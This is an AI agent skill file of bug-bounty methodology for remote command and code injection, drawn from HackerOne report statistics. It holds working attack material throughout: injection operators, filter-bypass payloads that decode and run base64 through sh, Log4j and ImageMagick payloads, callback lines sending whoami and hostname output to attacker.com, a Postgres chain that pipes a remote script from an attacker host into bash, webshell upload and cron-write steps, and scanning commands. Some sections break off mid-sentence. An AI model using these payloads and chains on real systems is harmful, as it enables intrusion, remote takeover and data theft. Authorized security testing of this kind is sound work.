---
name: bbhunt-rce
description: "Use for OS command injection, code injection, unsafe eval, shell-out argument injection, template-to-RCE, and server-side code execution through upload or file write. Unified from 3 upstream skills (cbh, h1skills, hunting). Plus evidence from all 15,259 disclosed HackerOne reports. For authorized security testing only."
agent_created: true
---

# Remote Code / Command Execution — unified methodology

> **Unified skill.** Built from 3 upstream skills across cbh, h1skills, hunting and the local HackerOne corpus. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.

## Corpus evidence (1399 valid reports, 338 paid / 24%)

Payment is not validity — zero-bounty disclosures are mined as evidence too.

### Techniques ranked across ALL valid writeups

| Technique | Reports |
|---|---:|
| public source-code / repo review | 393 |
| internal service / port / container | 221 |
| file upload / filename / extension | 220 |
| HTTP method / verb tampering | 200 |
| admin / privileged-role context | 188 |
| encoding / double-encode / null byte | 159 |
| WAF / sanitizer / filter bypass | 153 |
| race / concurrency / timing | 130 |
| Content-Type / body-format switch | 119 |
| cache / CDN / unkeyed header | 100 |

### Parameters observed

`mrb`, `entry`, `proc`, `self`, `class`, `src`, `argc`, `href`, `name`, `argv`, `version`, `stack_keep`, `charset`, `type`, `value`

### Case studies (real reports, paid and unpaid)

- [1679624](https://hackerone.com/reports/1679624) GitLab — Remote Command Execution via Github import ($33510, critical)
- [1609965](https://hackerone.com/reports/1609965) GitLab — RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag) ($33510, critical)
- [925585](https://hackerone.com/reports/925585) PayPal — RCE via npm misconfig -- installing internal libraries from the public registry ($30000, critical)

Full payload bank, bypass frequencies, approach patterns and case-study excerpts: `references/evidence.md`.

## Corpus-backed method (this class)

1. Identify the interpreter boundary: shell, language eval, template engine, deserializer, or OS-level file write. Each needs a different payload grammar.
2. Prefer source review for shell-outs: a command string built from a user-controlled filename or path is the classic pattern in the corpus.
3. Distinguish command injection from argument injection — when a fixed binary is invoked, inject flags/environment rather than shell metacharacters.
4. Use OAST with a command-specific marker to prove blind execution; avoid destructive commands entirely.
5. For interpreter/RCE chains, identify the engine before escalating (see bbhunt-ssti, bbhunt-deserialization).
6. Confirm with an unambiguous observation: command output, a file created in a sandbox, or a callback carrying your marker.
7. Minimize and document the exact trust boundary; prove the capability an attacker gains.

### Signals

- Features that shell out: archive handling, media conversion, import/export, PDF generation
- Template engines, eval-like functions, or user-controlled code/config
- Upload plus later execution, or writes to configurable paths
- Version/CVE signal on an internet-reachable service

### Kill criteria

- No execution evidence — only an error or a generic callback.
- Code runs only in a build/CI context you cannot influence as an attacker.
- Requires local access or a privileged precondition.

### Escalation chains

- Path/filename control -> shell-out -> RCE.
- Deserialization or SSTI -> RCE -> internal network access.
- Upload + writable executable path -> webshell -> RCE.

### Veteran tip

Source-code review and internal-service discovery are the top corpus techniques for this class — read the import/export and media-pipeline code first.

## Unified upstream methodology (deduplicated)

### Discovery and hunting method

### Quick wins

Start here. These are the highest-yield tests for this class.

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Use time-based and OOB callbacks, not just output reflection.
- Test argument injection on tools that take filenames/URLs (curl, ffmpeg, git, ImageMagick).
- Check upload -> processing chains (SVG, image, office, archive).
- Look at admin/debug endpoints and internal tooling exposed to users.

### Deeper checklist

- Map sinks: shell exec, eval, template render, image/PDF converters, archive tools, CI runners.
- Test command injection with time-based and OOB callbacks, not just output reflection.
- Try argument injection on tools that accept filenames/URLs (curl, ffmpeg, git, imagemagick).
- Check file upload + processing chains (SVG, image, office, archive) for code paths.
- Test expression languages, spreadsheet formulas, and template engines.
- Look at admin/debug endpoints and internal tooling exposed to users.
- Escalate from injection to a clear impact: command output, file read, or callback.

### Autonomous Testing Priority

**Content-type is the #1 silent failure mode for command injection.**

Traditional web forms use `Content-Type: application/x-www-form-urlencoded`. If you send a JSON body (`{"host":"127.0.0.1;id"}`) to a form endpoint, the server reads `request.form['host']` and gets nothing — the app executes normally with no injection, returning a plausible 200 response. You get a false negative with no indication anything went wrong.

**Rule:** If the page has an HTML form (`<form method="POST">`), use form-encoding. If the path is `/api/...` or the response is JSON, use JSON.

**Command injection operators to try (in order of prevalence):**
```
value;id        ← Unix semicolon (most common)
value|id        ← pipe
value&&id       ← AND
value$(id)      ← subshell
value`id`       ← backtick
```

**Proof:** OS command output (`uid=N(username) gid=...`) in the response body confirms code execution. The output may be HTML-wrapped — that still counts. If the response is otherwise normal (200, expected content) with the command output appended or embedded, exploitation is confirmed.

---

### Step-by-Step Hunting Methodology

1. **Map the execution contexts first.** Before testing payloads, identify everywhere user-controlled input touches an execution layer: template engines, shell commands, YAML parsers, file paths used in operations, package resolution, and configuration files.

2. **Enumerate admin/management interfaces.** Crawl for `/management-console`, `/admin`, `/_internal`, `/setup`, `/config`. These surfaces are lower-auth and higher-privilege — the GHES cluster produced 6 separate RCEs from one console role.

3. **Check template injection in every config field.** In any management UI that accepts free-form configuration (log destinations, notification formats, proxy settings), submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`. Look for `49` in responses, logs, or DNS callbacks.

4. **Test YAML/XML/serialized input for code execution.** Any endpoint accepting `Content-Type: application/yaml` or `application/xml`:
   - SnakeYAML: submit `!!javax.script.ScriptEngineManager` gadget
   - Ruby YAML: submit `!ruby/object:Gem::Installer` gadget
   - REXML: submit billion-laughs / quadratic blowup XML

5. **Hunt dependency confusion.** For every npm/pip/gem internal package name visible in JS bundles, error messages, or `package.json` in public repos — register a higher-versioned package on the public registry pointing to a canary callback.

6. **Check file path operations for traversal → execution.** ActiveStorage, file upload handlers, symlink operations: submit `../../../etc/cron.d/shell` as filename. Confirm write then trigger execution.

7. **Audit Kubernetes/

### A. Discovery checklist — concrete artifacts, endpoints, patterns, tools to look for

- **OWASP A05:2025 Injection** is the home category (CWE-77/78 command, CWE-88 argument, CWE-1336 SSTI). Injection is 100% covered by tested apps and has the most CVEs of any category — treat every interpreter-facing input as a candidate.
- **Classic command-injection sinks:** network diagnostics (`ping`, `host`, `nslookup`, `traceroute`), converters (`convert`, `zip`, `ffmpeg`, `exiftool`), mail (`mail -s`), PDF generators, backup/maintenance forms, search, and CGI/admin wrappers. Trace *filenames* and header values (`X-Forwarded-For`) into the command string, not just visible form fields.
- **Top 25 RCE-flavoured parameters (trbughunters):** `cmd`, `exec`, `command`, `execute`, `ping`, `query`, `jump`, `code`, `reg`, `do`, `func`, `arg`, `option`, `load`, `process`, `step`, `read`, `function`, `req`, `feature`, `exe`, `module`, `payload`, `run`, `print`.
- **Dangerous APIs by language (OWASP WSTG INPV-12):** Java `Runtime.exec()`; C/C++ `system/exec/ShellExecute`; Python `exec/eval/os.system/os.popen/subprocess.Popen`; PHP `system/shell_exec/exec/proc_open/eval/passthru`; Node `child_process.exec/execSync/spawn`; Ruby `system/exec/Open3.popen3`; Go `exec.Command`; C# `Process.Start`.
- **Argument/option injection (no shell needed):** any value beginning `-`/`--` passed via `execve`/`execFile` to `curl` (`-o /path`, `-K <url>`), `ping` (`-f`, `-c 100000`), `tcpdump` (`-G 1 -W 1 -z /path/script.sh`), ExifTool (`-if` with Perl expressions, newline-delimited argument smuggling via JSON ke

### Signals and surfaces

### Signal

- Reports: **1,399** · paid: **338**
- Median bounty **$800** · p90 **$8,000** · max **$33,510** · total **$888,597**
- Median upvotes **11**

### Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| GitLab | 38 | $179,420 | 5024 |
| shopify-scripts | 85 | $173,800 | 632 |
| Internet Bug Bounty | 129 | $98,057 | 2062 |
| Pornhub | 8 | $43,600 | 1008 |
| PayPal | 2 | $39,700 | 1797 |
| Uber | 18 | $32,000 | 816 |
| Mail.ru | 34 | $27,450 | 1686 |
| X / xAI | 20 | $26,180 | 2306 |

### Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`cmd` `exec` `command` `run` `eval` `template` `import` `convert` `render` `filename` `url`

### Crown Jewel Targets

RCE vulnerabilities command the highest payouts in bug bounty programs because they grant attackers direct execution control over target infrastructure. The highest-value targets are:

**Highest-paying asset types:**
- **Enterprise server products** (GitHub Enterprise Server, self-hosted GitLab) — privilege escalation chains from low-privileged console roles to root SSH access consistently pay critical/high
- **Supply chain / package registries** — dependency confusion attacks against npm, PyPI, etc. hit critical severity across every major program
- **Cloud-native infrastructure** — exposed Kubernetes API servers, ingress controllers, and misconfiqured CI/CD pipelines
- **Mobile app backends and OAuth flows** — where server-side processing of attacker-controlled data meets execution contexts
- **Admin/management consoles** — template injection in configuration panels reaches root with a single payload

**Why this class pays most:**
- Blast radius is infrastructure-wide, not user-scoped
- Proof-of-concept is unambiguous — shell output is undeniable
- Fix requires architectural changes, not just a patch
- Programs cannot afford false negatives on RCE

---

### Response Headers / Tech Stack Signals

```
X-Powered-By: Express          # Node.js — npm dependency surface
X-Powered-By: Phusion Passenger
Server: nginx (ingress-nginx)  # Kubernetes ingress — path field injection
X-Runtime: Ruby                # Rails ActiveStorage, RDoc, REXML attack surface
Content-Type: application/yaml # YAML parsers (SnakeYAML, Psych) — deserialization
X-GitHub-Enterprise-Version    # GHAS — nomad template, collectd, syslog-ng injection
```

### JavaScript / Frontend Signals

```javascript
// Look for these patterns in JS bundles
fetch('/api/exec', {method:'POST', body: cmd})
eval(userInput)
new Function(userInput)
document.write(unsafeData)
window.location = userControlled  // URL scheme bypass → JS execution
```

_...and 1 more sections in `references/unified-method.md`._

### Techniques, payloads and bypasses

### Payloads & probes

- Shell -> `;id`, `|id`, `$(id)`, backticks, `%0aid`, newline injection
- Argument -> `--output=/tmp/x`, `-o`, `--config`, `file://`
- Expression -> `${7*7}`, `{{7*7}}`, `#{7*7}`, `<%= 7*7 %>`
- Log4j -> `${jndi:ldap://callback/a}`
- ImageMagick -> `push graphic-context` / `fill 'url(https://callback/x)'`

### Payload bank

**53 curated payloads** in 5 context groups. Try them in order, stop at the first hit, then minimize. These are seeds, not a substitute for understanding the sink.

### Space / filter bypass

```text
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat</etc/passwd
c\at /etc/passwd
c'a't /etc/passwd
/bin/cat$IFS/etc/passwd
$(printf '\x69\x64')
echo${IFS}aWQ=|base64${IFS}-d|sh
id%09
id%0a
;id;#
|id|
```

### Bypass tricks

- Blind via DNS/HTTP callback; encode spaces as `${IFS}`, `%09`, `$()`.
- Bypass blocklists with base64, wildcards, quotes, and environment variables.
- Use file-write + include, or log poisoning, when direct exec is blocked.

### Techniques from real reports

One concrete lesson per report (mined from the writeup), newest and most-upvoted first. Read 5–10 before testing.

- **Potential pre-auth RCE on Twitter VPN** — `#591295` · X / xAI · $20,160 · ▲1246
  > For security concern, we didn't attach the `mtmp/system` and the `dataa/data.mdb`.
- **Exposed Kubernetes API - RCE/Exposed Creds** — `#455645` · Snapchat · $25,000 · ▲1191
  > During a worldwide kubernetes scan with binaryedge.io i found a K8 exposed internal API endpoint without authorization to the public.
- **RCE via npm misconfig -- installing internal libraries from the public registry** — `#925585` · PayPal · $30,000 · ▲946
  > [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610?sk=991ef9a180558d25c5c6bc5081c99089)
- **DoS on PayPal via web cache poisoning** — `#622122` · PayPal · $9,700 · ▲851
  > On https://paypal.com/, you could impact core functionality by using an invalid Transfer-Encoding header to replace JavaScript files from www.paypalobjects.com with the message '501 Not Implemented'.
- **H1514 Remote Code Execution on kitcrm using bulk customer update of Priority Products** — `#422944` · Shopify · $0 · ▲830
  > When uploading an ImageTragick (issue found my Tavis Ormandy) using the following payload (my netcat listener is on `██████████:8080`:
- **Remote Code Execution on www.semrush.com/my_reports on Logo upload** — `#403417` · Semrush · $0 · ▲824
  > Tavis Ormandy has also mentioned recently that the policy.xml needs to 

### Payload fragments observed

Recurring payloads from this class's writeups. Adapt, don't paste blindly.

| Seen | Fragment |
|---:|---|
| 7× | `$where` |
| 5× | `SFORMAT()` |
| 4× | `https://twitter.com/{username}/moments` |
| 4× | `<img>` |
| 4× | `..;/` |
| 4× | `requestOCSP()` |
| 4× | `loadSession()` |
| 4× | `VM.doCODESIZE()` |
| 4× | `discover()` |
| 4× | `%00` |
| 3× | `eval()` |
| 3× | `OsCommand.writeJson()` |
| 3× | `$templates` |
| 3× | `<local_file_path>` |
| 3× | `<webview>` |
| 3× | `loadSNI()` |
| 3× | `<div>` |
| 3× | `$GITHUB_TOKEN` |
| 3× | `install_packages()` |
| 3× | `=cmd\\|' /C calc'!A0` |

_...and 11 more sections in `references/unified-method.md`._

### Validation and proof

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

### Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

### Gate 0 Validation

Before writing the report, confirm all three:

**1. What can the attacker DO right now?**
You must be able to demonstrate one of: execute `id`/`whoami` and capture the output, make a DNS/HTTP callback from the target server to your controlled host, write a file to the filesystem, or read `/etc/passwd`. "Might be able to" fails this gate.

**2. What does the victim LOSE?**
Articulate the concrete impact: source code exfiltration, credential theft (database, API keys, cloud IAM), lateral movement to internal network, supply chain compromise of downstream users, data destruction. Generic "attacker gains RCE" fails — name the crown jewels at risk.

**3. Can it be reproduced in 10 minutes from scratch?**
Write the reproduction steps before submitting. If you need more than: (a) a Burp request, (b) a payload file, and (c) a listener — simplify it. If reproduction requires a specific race condition, timing, or ephemeral state, document the exact conditions. Triagers who can't reproduce in one attempt will downgrade or close the report.

---

### C. Validation / proof bar — how to confirm and avoid false positives

- **Three detection tiers, most reliable first:** OOB callback > time delay > in-band output. Time-based misses asynchronous execution; in-band output misses blind sinks. Use `SHELLING` payload marking to trace which payload produced a result.
- **Prove execution, not just parsing:** a reflected `uid=` string, an `id`-labelled DNS callback, or `whoami` file contents with a unique marker. A 500 error or a generic "command failed" is not RCE.
- **Parent process behaviour matters:** a WAF/logging pipeline that only inspects response bodies misses blind injection entirely — confirm with an out-of-band interaction, not a status code.
- **Distinguish command injection from argument injection** (leading hyphen) and from code injection (`eval`/template) — mitigation and reporting differ; `execFile` removing the shell does not remove option-injection risk.
- **Second-order chains require full path tracing:** from unauthenticated log writer → scheduled reader → later shell sink; an immediate HTTP response is not proof. The same applies to stored email/filename values consumed by later admin actions.
- **Deserialization gate:** a serialized blob that is parsed-and-reserialized (removing the carrier) is not exploitable — confirm the original text survives to a shell/render sink.
- **Pre-Severity Gate:** a file-write-only primitive with no execution path is not RCE; a sandboxed eval that cannot reach `os` is at most Medium SSTI. Pinning down the effective user (`whoami`) and OS (`uname -a`/`ver`) is part of the pr

### Out-of-Band RCE Confirmation

```bash
# Payload to confirm blind RCE via DNS
curl "http://$(id | base64).YOUR-INTERACTSH-URL/"
nslookup $(whoami).attacker.com
wget http://attacker.com/$(cat /etc/hostname)
```

### Escalation and related chains

### Escalation chains

- RCE -> cloud creds -> lateral movement.
- Upload + parser -> RCE.
- SSTI -> RCE.

### Chains & Compositions (Senior Hunting)

RCE in 2020-2026 rarely arrives at a single sink. Every modern RCE is composed of (1) a primitive that puts attacker bytes onto the host or into a deserialization pipeline, plus (2) an exec gadget that interprets them. The chains below decompose six high-paying RCE shapes into their primitive components — each step is testable in isolation, the chain is what pays.

### Chain 1 — SSRF + IMDSv1 + Leaked IAM Role → Lambda Invoke → Backend RCE (Capital One pattern)

- **A.** SSRF on a server-side fetcher (link-preview, image proxy, webhook URL, PDF generator). Confirmed via Burp Collaborator OOB callback.
- **B.** Point SSRF at AWS IMDSv1 metadata: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` → returns temporary STS credentials.
- **C.** Use the credentials with `aws lambda invoke --function-name <internal-function>` — Lambda runs server-side code that the attacker can influence via the function's input parameter.
- **Impact:** Full backend RCE in the Lambda context, plus pivot path to whatever else the role grants (S3 / DynamoDB / RDS).
- **Real shape:** Capital One 2019 — $80M civil penalty, attacker conviction. SSRF in a WAF on EC2 → IMDSv1 → IAM role → 106M-record breach via S3 sync. Cross-refs `ssrf` Disclosed Report Citation #6.

### Chain 2 — SQLi + `COPY FROM PROGRAM` → Direct OS-level RCE on Postgres Host

- **A.** SQLi confirmed on a Postgres backend (boolean/time-based works; UNION not needed).
- **B.** The DB user has either `pg_read_server_files` or `COPY` privileges (default for many AWS RDS / Google Cloud SQL roles when "admin" databases exist).
- **C.** Stack a query: `'; COPY users FROM PROGRAM 'curl http://attacker/x.sh | bash'; --` → Postgres shells out to `/bin/sh -c <attacker command>` → RCE as `postgres` user.
- **Impact:** RCE as the database user, which on managed Postgres frequently has IAM credentials and direct access to other AWS resources.
- **Real shape:** Multiple H1 disclosures 2020-2024 across SaaS apps backed by Postgres. Cross-refs `sqli` Disclosed Report Citation #12 and root cause discussion of `FILE`/`xp_cmdshell` privileges.

### Chain 3 — Image Upload + Path Traversal in Filename + Misconfigured MIME Serving → Webshell

- **A.** File upload accepts images (`image/png`, `image/jpeg`). The server saves with the user-supplied filename or only validates Content-Type, not actual content.
- **B.** Upload a `.aspx`/`.jsp`/`.php` file with the correct image magic-bytes (`GIF89a` + PHP after) and a filename containing `../` to write outside the upload directory into the web-root (`../../../public/webshell.php`).
- **C.** Request `https://target/webshell.php?cmd=id` — server's PHP/ASP.NET handler runs the script regardless of extension policy because the path doesn't pass through the upload-dir filter.
- **Impact:** Unauthenticated or low-priv attacker gets webshell on the application server with the web-server's process privileges.
- **Real shape:** Multiple disclosed H1 cases on legacy upload handlers; canonical pre-2020 RCE class. Pairs with `file-upload` (upload bypass table) and `misc` path-traversal patterns.

### Chain 4 — Prototype Pollution + Lodash/Mongoose Gadget Chain → `child_process.spawn` → Node RCE

- **A.** Identify prototype pollution sink — JSON merge / Object.assign / lodash `_.merge` / Node `Object.create` chain receiving attacker JSON.
- **B.** Pollute `Object.prototype.shell` to `true` OR `Object.prototype.env.NODE_OPTIONS` to `--require ./malicious.js`. The polluted prototype reaches a downstream `child_process.spawn` or `vm.runInThisContext`.
- **C.** Sink executes with attacker-controlled shell/env → attacker code runs in Node.js process context with full access to environment variables, AWS metadata, internal services.
- **Impact:** Server-side JS execution from a JSON POST. Common in Express apps using `body-parser` + `lodash.merge` for config-merging.
- **Real shape:** `lodash.merge` CVE-2018-16487, CVE-2019-10744, CVE-2020-8203; `mongoose` CVE-2024-53900 (cross-refs `sqli` Disclosed Report Citation #10 — same gadget family reaches Mongo `$where` instead of process).

_...and 10 more sections in `references/unified-method.md`._

### Tools and wordlists

### Tools

`interactsh` · `commix` · `ysoserial` · `nuclei` · `Burp`

### Wordlists

Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.

| File | Entries |
|---|---:|
| `~/.local/share/hackerone-reports/wordlists/paths_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/params_rce.txt` | 150 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce.txt` | 53 |
| `~/.local/share/hackerone-reports/wordlists/payloads_rce_waf.txt` | 12 |
| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |
| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |

```sh
W=~/.local/share/hackerone-reports/wordlists
ffuf -u https://target/FUZZ -w $W/paths_rce.txt \
     -mc all -fc 404 -fs 0 -rate 40
ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_rce.txt \
     -mr 'canary|error|invalid|not found' -rate 40
ffuf -u 'https://target/api?<param>=FUZZ' -w $W/payloads_rce.txt \
     -mr '<hit-marker>' -rate 20
```

### Nuclei

Use OAST for blind command injection; check argument injection in tools that shell out.

```sh
nuclei -u https://target -tags rce,cmdi,oast \
       -severity low,medium,high,critical -rl 40 -o nuclei_rce.txt
nuclei -u https://target -t ~/nuclei-templates/dast/vulnerabilities/cmdi -dast \
       -rl 40 -o nuclei_rce_cmdi.txt
nuclei -u https://target -t ~/nuclei-templates/http/fuzzing/header-command-injection.yaml \
       -rl 40 -o nuclei_rce_header-command-injection.txt
# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'
```

Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.

### Grep Patterns for Source Review

```bash
# Command injection sinks
grep -rn "exec\|system\|popen\|spawn\|eval\|subprocess" --include="*.rb" .
grep -rn "Runtime.exec\|ProcessBuilder\|ScriptEngine" --include="*.java" .

# Template engine instantiation
grep -rn "Mustache\|Handlebars\|nunjucks\|render_template\|Template\(" .

# Unsafe YAML load
grep -rn "yaml\.load\b\|YAML\.load\b" . # without Loader= argument
grep -rn "Yaml()\|new Yaml()" --include="*.java" .
```

---

## Source skills merged into this topic

- `h1skills` — `hackerone-rce`
- `hunting` — `rce`
- `cbh` — `hunt-rce`

## References

- `references/unified-method.md` — complete deduplicated union of all upstream sections
- `references/upstream-*.md` — full original SKILL.md from each contributing repo
- `references/upstream-assets/` — 2 companion files (payload/technique references, scripts, validators and schemas) from the contributing skills
- `references/unified-method.md` — includes 2 merged companion methodology documents
- `references/corpus-wordlists/` — 4 mined paths/params/payload lists from the HackerOne corpus
- `../../upstream/` — complete unmodified archives of all five source repositories
- `references/evidence.md` — corpus technique frequencies, parameters, case studies and payload bank
- `bbhunt-methodology` — orchestrator, state machine and class router
